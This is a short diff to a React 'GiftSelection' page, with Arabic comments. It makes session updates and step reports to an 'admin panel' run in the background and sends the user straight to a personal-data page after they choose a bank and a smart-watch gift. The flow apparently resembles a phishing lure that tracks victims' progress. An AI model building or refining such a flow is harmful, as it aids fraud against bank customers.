@@ -37,25 +37,20 @@ export default function GiftSelection() {
     setSelectedGift(id);
     localStorage.setItem("selectedGift", id.toString());
     
-    // تحديث الجلسة بنوع الهدية وإبلاغ لوحة الإدارة بالخطوة الحالية
-    try {
-      await createSessionMutation.mutateAsync({
-        sessionId: session,
-        selectedBank: bank,
-        selectedGift: `Smart Watch Gift #${id}`
-      });
-      
-      await reportStepMutation.mutateAsync({
-        sessionId: session,
-        step: "personal-data"
-      });
-    } catch (e) {
-      console.error("Failed to update gift in session", e);
-    }
+    // تحديث الجلسة وإبلاغ لوحة الإدارة في الخلفية
+    createSessionMutation.mutate({
+      sessionId: session,
+      selectedBank: bank,
+      selectedGift: `Smart Watch Gift #${id}`
+    });
+    
+    reportStepMutation.mutate({
+      sessionId: session,
+      step: "personal-data"
+    });
 
-    setTimeout(() => {
-      setLocation(`/personal-data?bank=${bank}&session=${session}&gift=${id}`);
-    }, 800);
+    // الانتقال الفوري للصفحة التالية
+    setLocation(`/personal-data?bank=${bank}&session=${session}&gift=${id}`);
   };
 
   return (
